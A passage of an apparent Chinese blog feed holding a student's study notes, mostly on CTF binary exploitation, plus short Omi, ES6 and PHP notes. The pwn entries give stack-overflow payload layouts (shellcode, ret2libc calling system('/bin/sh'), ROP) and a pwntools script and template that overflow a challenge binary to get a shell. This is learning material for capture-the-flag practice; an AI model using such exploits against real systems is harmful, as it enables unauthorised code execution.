<li>实测可以不需要先卸载，阔以直接装</li>
</ul>
</li>
<li>然后重启<ul>
<li>尚且不知道这次重启是不是必须的</li>
</ul>
</li>
<li>然后就能用了</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[binAry]]></title>
      <url>/2017/04/21/binAry/</url>
      <content type="html"><![CDATA[<h3 id="p32-u32"><a href="#p32-u32" class="headerlink" title="p32 u32"></a>p32 u32</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0xdeadbeef</span>) == struct.pack(<span class="string">'I'</span>, <span class="number">0xdeadbeef</span>)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">'abcd'</span>) == struct.unpack(<span class="string">'I'</span>, <span class="string">'abcd'</span>)[<span class="number">0</span>]</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'37130000'</span>.decode(<span class="string">'hex'</span>) == <span class="string">'\x37\x13\x00\x00'</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u8(<span class="string">'\x41'</span>) == <span class="number">0x41</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u8(<span class="string">'A'</span>) == <span class="number">0x41</span></div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure>
<h4 id="Notice"><a href="#Notice" class="headerlink" title="Notice:"></a>Notice:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u32(&apos;abcd&apos;) =&gt; u32(&apos;\x61\x62\x63\x64&apos;)</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;A&apos; =&gt; &apos;\x41&apos; =&gt; String</div><div class="line">0x41 =&gt; number</div></pre></td></tr></table></figure>
<p><code>struct.unpack</code> =&gt; <a href="http://blog.csdn.net/gracioushe/article/details/5915900" target="_blank" rel="external">http://blog.csdn.net/gracioushe/article/details/5915900</a><br><code>struct</code> =&gt; <a href="https://docs.python.org/2/library/struct.html" target="_blank" rel="external">https://docs.python.org/2/library/struct.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[能看得懂的CBC攻击]]></title>
      <url>/2017/04/14/%E8%83%BD%E7%9C%8B%E5%BE%97%E6%87%82%E7%9A%84CBC%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p><a href="http://k1n9.me/2017/03/16/attack-in-cbc/" target="_blank" rel="external">http://k1n9.me/2017/03/16/attack-in-cbc/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[checksec]]></title>
      <url>/2017/04/14/checksec/</url>
      <content type="html"><![CDATA[<p>mark 一下,感觉大家都在用这个<br><a href="http://bestwing.me/2016/12/26/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="external">http://bestwing.me/2016/12/26/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出]]></title>
      <url>/2017/04/14/ROP/</url>
      <content type="html"><![CDATA[<h2 id="人家的文章写的就是好"><a href="#人家的文章写的就是好" class="headerlink" title="人家的文章写的就是好"></a>人家的文章写的就是好</h2><p><a href="http://paper.seebug.org/271/" target="_blank" rel="external">http://paper.seebug.org/271/</a><br><a href="http://paper.seebug.org/272/" target="_blank" rel="external">http://paper.seebug.org/272/</a></p>
<h2 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h2><p>内存布局随机化(ASLR): 一个会妨碍我们进行攻击的措施，字面意思</p>
<h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">+++++++++++++++++++++++++ high Add</div><div class="line">Return Address                      return to F&apos;s F&apos;s next sentence</div><div class="line">------------------------ 0xA</div><div class="line">Caller&apos;s Caller&apos;s EBP               F&apos;F</div><div class="line">------------------------ 0xB</div><div class="line">some state about Caller             F&apos;s data</div><div class="line">------------------------ 0xC</div><div class="line">Callee&apos;s Arg                        Child&apos;s arg</div><div class="line">------------------------ 0xD</div><div class="line">Return Address                      return to F&apos;s next sentence</div><div class="line">------------------------ 0xE</div><div class="line">Caller&apos;s EBP                        *save Callers&apos;s data basis Adddress, is not now EBP(is this Addr)</div><div class="line">------------------------ 0xF</div><div class="line">Local Var                           Child&apos;s data</div><div class="line">++++++++++++++++++++++++ low Add</div></pre></td></tr></table></figure>
<p>Caller’s EBP 那个地址<code>0xF</code>存的那个数据<code>0xB</code>是Caller的基地址<br>但那个地址正好是<code>0xF</code>正好是Callee的基地址(也许是<code>0xE</code>???)</p>
<h2 id="四种栈溢出利用姿势"><a href="#四种栈溢出利用姿势" class="headerlink" title="四种栈溢出利用姿势"></a>四种<code>栈溢出</code>利用姿势</h2><h3 id="一个注意的点是payload里不要包含0x00，会被截断的"><a href="#一个注意的点是payload里不要包含0x00，会被截断的" class="headerlink" title="一个注意的点是payload里不要包含0x00，会被截断的"></a>一个注意的点是payload里不要包含<code>0x00</code>，会被截断的</h3><ul>
<li><p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
</li>
<li><p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
</li>
<li><p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
</li>
<li><p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
</li>
</ul>
<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>payload : padding1 + address of shellcode + padding2 + shellcode<br>padding1: 通常都是可随意填写，调试确定具体长度<br>一般的，可能无法确定padding2的具体大小，所以会填充若干<code>\x90</code><br>padding2: \x90 + \x90 + … , 因为<code>\x90</code>是<code>nop</code><br>前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）</p>
<h3 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h3><p>payload : padding1 + address of system() + padding2 + address of “/bin/sh”<br>padding1: 能随意填写，调试确定呢具体长度<br>padding2: 数据长度为4（32位机），对应调用 system() 时的返回地址。<br>其实不是很理解这个padding2, padding2的这个位置不应该是<code>system</code>函数的第一个参数吗<br>不是应该直接填写<code>/bin/sh</code>吗0.0 不太懂….先跳过吧<br>因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>payload : padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n<br>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。<br>为了拼凑代码段，以执行一次系统调用，帅气~</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><p>要复习考试了，暂停中</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Omi-learn]]></title>
      <url>/2017/04/14/Omi-learn/</url>
      <content type="html"><![CDATA[<h2 id="关于Omi"><a href="#关于Omi" class="headerlink" title="关于Omi"></a>关于Omi</h2><p>Omi 是腾讯前端团队…balabala</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir omi-demo</div><div class="line"><span class="built_in">cd</span> omi-demo</div><div class="line">wget https://unpkg.com/omi@1.3.2/dist/omi.min.js</div><div class="line">sudo npm install -g browser-sync</div></pre></td></tr></table></figure>
<p>哦，本来其实<code>browser-sync</code>和<code>Gulp</code>一起用的，我没有就不xx了</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>抄了一个demo <code>index.js</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> Omi <span class="keyword">from</span> <span class="string">'./omi.min.js'</span>;</div><div class="line"> </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Omi</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>(data) &#123;</div><div class="line">        <span class="keyword">super</span>(data);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    style () &#123;</div><div class="line">        <span class="keyword">return</span>  <span class="string">`</span></div><div class="line"><span class="string">        &lt;style&gt;</span></div><div class="line"><span class="string">            h1&#123;</span></div><div class="line"><span class="string">                cursor:pointer;</span></div><div class="line"><span class="string">            &#125;</span></div><div class="line"><span class="string">        &lt;/style&gt;</span></div><div class="line"><span class="string">         `</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    handleClick(target, evt)&#123;</div><div class="line">        alert(target.innerHTML);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span>  <span class="string">`</span></div><div class="line"><span class="string">        &lt;div&gt;</span></div><div class="line"><span class="string">            &lt;h1 onclick="handleClick(this, event)"&gt;Hello ,&#123;&#123;name&#125;&#125;!&lt;/h1&gt;</span></div><div class="line"><span class="string">        &lt;/div&gt;</span></div><div class="line"><span class="string">        `</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">Omi.render(<span class="keyword">new</span> Hello(&#123; <span class="attr">name</span> : <span class="string">"Omi"</span> &#125;),<span class="string">"#container"</span>);</div></pre></td></tr></table></figure></p>
<p>好了，跑一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">browser-sync start --server index.js</div></pre></td></tr></table></figure>
<p>然后访问下<code>http://localhost:3000/</code></p>
<p>好了，<code>Cannot GET /</code>，失败</p>
]]></content>
      
        
        <tags>
            
            <tag> Omi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[es6学习]]></title>
      <url>/2017/04/14/es6%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>今天又是周五，下周有一门考试，今天上午浪完，下午就去复习<br><a id="more"></a></p>
<blockquote>
<p>所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。</p>
</blockquote>
<h2 id="状态的改变"><a href="#状态的改变" class="headerlink" title="状态的改变"></a>状态的改变</h2><p><code>Pending</code> =&gt; <code>Resolved</code> =&gt; <code>Rejected</code><br>分别是 进行中， 已完成， 失败</p>
<p>## </p>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> es6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[前端框架安全问题]]></title>
      <url>/2017/04/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ssrf]]></title>
      <url>/2017/04/13/ssrf/</url>
      <content type="html"><![CDATA[<p>先mark</p>
<p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[gopher]]></title>
      <url>/2017/04/13/gopher/</url>
      <content type="html"><![CDATA[<p>先mark<br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[glibc]]></title>
      <url>/2017/04/13/glibc/</url>
      <content type="html"><![CDATA[<p><a href="http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free" target="_blank" rel="external">http://fanrong1992.github.io/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[条件竞争]]></title>
      <url>/2017/04/13/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      <content type="html"><![CDATA[<p>好菜啊，看0ctf的wp才看到这个东西</p>
<p>仔细看了看就是互锁,临界区之类的问题，好像在上学期学的某门课里学过，先mark一下</p>
<p><a href="http://www.freebuf.com/articles/network/107077.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/107077.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn入门]]></title>
      <url>/2017/04/13/pwn%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol>
<li>pwntools or zio<br> 用来写payload的库</li>
<li>ida<br> 调调调</li>
<li><p>socat<br> 我暂且认为他可以把题目的输入重新定向到某个端口上<br> 第一次跑</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP4-LISTEN:123456,fork EXEC:./rop_rop_rop</div></pre></td></tr></table></figure>
<p> 地址复用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP-LISTEN:123456,reuseaddr,fork EXEC:./rop_rop_rop</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>down下题目来, ida分析<br> 例如, <code>syc</code> 的 <code>rop_rop_rop</code>, 三次<code>rop</code></li>
<li><p>写出<code>payload</code>, <code>poc_local.py</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>)</div><div class="line"></div><div class="line">step1Addr = <span class="number">0x0804871e</span></div><div class="line">step2Addr = <span class="number">0x08048766</span></div><div class="line">step3Addr = <span class="number">0x080487a3</span></div><div class="line">mainAddr  = <span class="number">0x0804867d</span></div><div class="line">shellcodeBuf = <span class="string">'a'</span> * <span class="number">7</span> + chr(<span class="number">0</span>) * <span class="number">9</span></div><div class="line"></div><div class="line">payload1 = shellcodeBuf + p32(step1Addr) + p32(mainAddr) + p32(<span class="number">0</span>) + p32(<span class="number">0x41414141</span>) + <span class="string">'\xd5\xc4\xb3\xa2'</span></div><div class="line">payload2 = shellcodeBuf + p32(step2Addr) + p32(mainAddr) + p32(<span class="number">0xff25a7d4</span>)+ p32(<span class="number">0x41414141</span>)</div><div class="line">payload3 = shellcodeBuf + p32(step3Addr) + p32(mainAddr) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xc0c0c0c</span>) + p32(<span class="number">0x9a829a82</span>)</div><div class="line">r.sendline(payload1)</div><div class="line">r.sendline(payload2)</div><div class="line">r.sendline(payload3)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
</li>
<li><p>本地调试</p>
<ol>
<li><p>先启动<code>socat</code>, 打开题目<code>rop_rop_rop</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP4-LISTEN:12345,fork EXEC:./rop_rop_rop</div></pre></td></tr></table></figure>
<p>这样<code>rop_rop_rop</code>就跑在<code>localhost</code>的<code>12345</code>端口了</p>
</li>
<li><p>跑一下脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chmod 775 ./poc_local.py</div><div class="line">./poc_local.py</div></pre></td></tr></table></figure>
</li>
<li><p>然后就会弹回来一个<code>shellcode</code></p>
</li>
</ol>
</li>
<li><p>然后把脚本里的地址改为题目地址和端口, 跑一遍出结果就可以了</p>
</li>
</ol>
<h2 id="别的"><a href="#别的" class="headerlink" title="别的"></a>别的</h2><p>把<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>)</div></pre></td></tr></table></figure></p>
<p>改成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = process(<span class="string">'./rop_rop_rop'</span>)</div></pre></td></tr></table></figure></p>
<p>这样子就可以不启动socat,进行调试了，但好像弹回来的<code>shell</code>有点问题，不能用</p>
<h2 id="简单的pwn模板"><a href="#简单的pwn模板" class="headerlink" title="简单的pwn模板"></a>简单的pwn模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"xxx.xxx.xxx.xxx"</span>, <span class="number">12345</span>)</div><div class="line"></div><div class="line">retAddr = <span class="number">0x080484A4</span></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">140</span> + p32(retAddr)</div><div class="line"><span class="comment"># use "'A' * 140" to padding the buf</span></div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p><a href="https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013" target="_blank" rel="external">https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013</a> 的4个rop题目</p>
<h2 id="找到两篇不错的文章"><a href="#找到两篇不错的文章" class="headerlink" title="找到两篇不错的文章"></a>找到两篇不错的文章</h2><p><a href="http://paper.seebug.org/271/" target="_blank" rel="external">http://paper.seebug.org/271/</a><br><a href="http://paper.seebug.org/272/" target="_blank" rel="external">http://paper.seebug.org/272/</a></p>
<h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>x86架构有两种格式汇编</p>
<p>Intel</p>
<blockquote>
<p>op dst, src</p>
</blockquote>
<p>AT&amp;T    寄存器前加<code>%</code>，数值前加<code>$</code></p>
<blockquote>
<p>op src, dst</p>
</blockquote>
<p>典型的内存分段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-------------------------------------</div><div class="line">|High =========================== Low|</div><div class="line">-------------------------------------</div><div class="line">|Stack| ========= |Heap|BSS|Data|Code|</div><div class="line">-------------------------------------</div></pre></td></tr></table></figure></p>
<blockquote>
<p>代码段存储可执行代码和只读常量（如常量字符串），属性可读可执行，但通常不可写。数据段存储已经初始化且初值不为0的全局变量和静态局部变量，BSS段存储未初始化或初值为0的全局变量和静态局部变量，这两段数据都有可写的属性。</p>
</blockquote>
<p>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CALL PTR;</div></pre></td></tr></table></figure></p>
<p>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RET;</div></pre></td></tr></table></figure></p>
<p>顺道吐槽一下，，网易云上<code>fripSide</code>的歌好像都不能听了。。。</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>最近还看到了<code>SROP</code>, <code>BROP</code> 真是可怕<br>常常要拼接出一次系统调用<code>SystemCall</code>,Linux下常常是<code>int 0x80</code> </p>
<blockquote>
<p>我的gdb里调试的时候并木有看到<code>int 0x80</code> 看到的就是<code>SystemCall</code></p>
</blockquote>
<p>在<code>SystemCall</code>之前，要把调用号存到<code>eax</code>, 然后调用参数按顺序存到<code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>.</p>
<blockquote>
<p>不过之前看到，，如果用栈的话，应该是逆序入栈的??</p>
</blockquote>
<p>125号调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mprotect (void *addr, size_t len, int prot)</div></pre></td></tr></table></figure></p>
<p>能够将栈的属性改成可执行，这样就很开心了，，，突然感觉像某zcl的语气</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[日常]]></title>
      <url>/2017/04/11/%E6%97%A5%E5%B8%B8/</url>
      <content type="html"><![CDATA[<ol>
<li><p>看了一篇<code>pwn</code>入门</p>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/695.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/695.html</a></li>
</ul>
</li>
<li><p>安装了传说中的<code>socat</code></p>
</li>
<li><p>调试了很简单的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gdb ./format1</div><div class="line">b <span class="built_in">printf</span></div><div class="line">r</div></pre></td></tr></table></figure>
</li>
</ol>
<p>结果出现了:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf.c: 没有那个文件或目录</div></pre></td></tr></table></figure></p>
<p>搜了半天发现要<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get <span class="built_in">source</span> libc6-dev</div></pre></td></tr></table></figure></p>
<p>根据提示看，貌似应该用(不管他了)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://anonscm.debian.org/git/pkg-glibc/glibc.git</div></pre></td></tr></table></figure></p>
<p>这个时候get了<code>glibc</code>源码(不知道是不是)<br>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ~/glibc-2.23 -name printf.c</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./stdio-common/printf.c</div></pre></td></tr></table></figure>
<p>这个时候重新进入gdb<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb ./format1</div><div class="line">directory ~/glibc-2.23/stdio-common/</div><div class="line">b <span class="built_in">printf</span></div><div class="line">r</div></pre></td></tr></table></figure></p>
<p>就好了</p>
<ol>
<li>mark了还没看的</li>
</ol>
<ul>
<li><a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6175651.html</a></li>
<li><a href="http://www.lucaroot.pw/" target="_blank" rel="external">http://www.lucaroot.pw/</a></li>
<li><a href="http://bestwing.me/page/5/" target="_blank" rel="external">http://bestwing.me/page/5/</a></li>
<li><a href="http://bobao.360.cn/ctf/detail/160.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/160.html</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> diary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[strings]]></title>
      <url>/2017/04/11/strings/</url>
      <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strings file | grep <span class="string">"ctf"</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php的Heredoc]]></title>
      <url>/2017/04/06/php%E7%9A%84Heredoc/</url>
      <content type="html"><![CDATA[<p>以前没见过，长见识了</p>
<p>表达字符串的方式</p>
<ol>
<li>单引号 (一切原样输出)</li>
<li>双引号</li>
<li><p>heredoc 句法结构：<code>&lt;&lt;&lt;</code><br> 特别注意的是结束标志不能缩进</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$str = <span class="string">&lt;&lt;&lt;EOD</span></div><div class="line"><span class="string">Example of string</span></div><div class="line"><span class="string">spanning multiple lines</span></div><div class="line"><span class="string">using heredoc syntax.</span></div><div class="line"><span class="string">EOD;</span></div><div class="line"></div><div class="line"><span class="comment">/* 含有变量的更复杂示例 */</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">var</span> $foo;</div><div class="line">    <span class="keyword">var</span> $bar;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="string">'Foo'</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;bar = <span class="keyword">array</span>(<span class="string">'Bar1'</span>, <span class="string">'Bar2'</span>, <span class="string">'Bar3'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$foo = <span class="keyword">new</span> foo();</div><div class="line">$name = <span class="string">'MyName'</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></div><div class="line"><span class="string">My name is "<span class="subst">$name</span>". I am printing some <span class="subst">$foo</span>-&gt;foo.</span></div><div class="line"><span class="string">Now, I am printing some <span class="subst">&#123;$foo-&gt;bar[1]&#125;</span>.</span></div><div class="line"><span class="string">This should print a capital 'A': \x41</span></div><div class="line"><span class="string">EOT;</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">My name is <span class="string">"MyName"</span>. I am printing some Foo.</div><div class="line">Now, I am printing some Bar2.</div><div class="line">This should <span class="keyword">print</span> a capital <span class="string">'A'</span>: A</div></pre></td></tr></table></figure>
</li>
<li><p>nowdoc, 类似heredoc</p>
